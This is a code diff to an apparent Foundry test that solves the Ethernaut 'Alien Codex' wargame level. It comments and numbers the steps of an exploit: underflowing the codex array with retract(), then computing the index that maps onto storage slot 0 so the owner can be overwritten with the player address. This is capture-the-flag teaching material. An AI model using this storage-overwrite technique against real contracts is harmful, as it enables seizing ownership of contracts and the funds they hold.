@@ -10,7 +10,6 @@ contract AlienCodexTest is Test {
     address player = address(100);
 
     function setUp() public {
-        // create new instance of ethernaut
         ethernaut = new Ethernaut();
         vm.deal(player, 5 ether); // give our player 5 ether
     }
@@ -23,7 +22,7 @@ contract AlienCodexTest is Test {
         /*
          * Here the set up is fairly different, we need to stick to 0.5.0 version.
          * we can have access to the abi
-         * Thanks to vm we can get the code and generate the bytes code of the contract
+         * Thanks to vm we can get the code (returns the creation bytecode )
          * Then we can create it with assembly
          */
         bytes memory alienCodeBytesCode = abi.encodePacked(
@@ -44,8 +43,8 @@ contract AlienCodexTest is Test {
          *************** */
         /*
          * Ok so now we have our alienCode contract.
-         * 1) we call the make_contact function to be able to pass the contacted modifier after
-         * 2) we want to call retract function as all the contract stored in the bytes32[]
+         * 1) we call the make_contact function to be able to pass the "contacted" modifier after
+         * 2) we want to call "retract" function as all the contract stored in the bytes32[] codex.
          *   calling retract making it underflow
          * 3) we need to compute the codex index corresponding to slot 0
          *   2²⁵⁶ - 1 - uint(keccak256(1)) + 1 = 2²⁵⁶ - uint(keccak256(1))
@@ -61,14 +60,17 @@ contract AlienCodexTest is Test {
          * ...
          * SLOT0 codex[2²⁵⁶ - 1 - uint(keccak256(1)) + 1] --> can write slot 0!
          */
+        // -- 1 --
         (bool successMakeContact, ) =alienCodexContract.call(abi.encodeWithSignature("make_contact()"));
         require(successMakeContact);
+        // -- 2 --
         (bool successRetract, ) =alienCodexContract.call(abi.encodeWithSignature("retract()"));
         require(successRetract);
-
+        // -- 3 --
         uint codexIndexForSlotZero = ((2**256) - 1) -
             uint(keccak256(abi.encode(1))) +
             1;
+        // -- 4 --
         bytes32 leftPaddedAddress = bytes32(abi.encode(player));
 
         // must be uint256 in function signature not uint
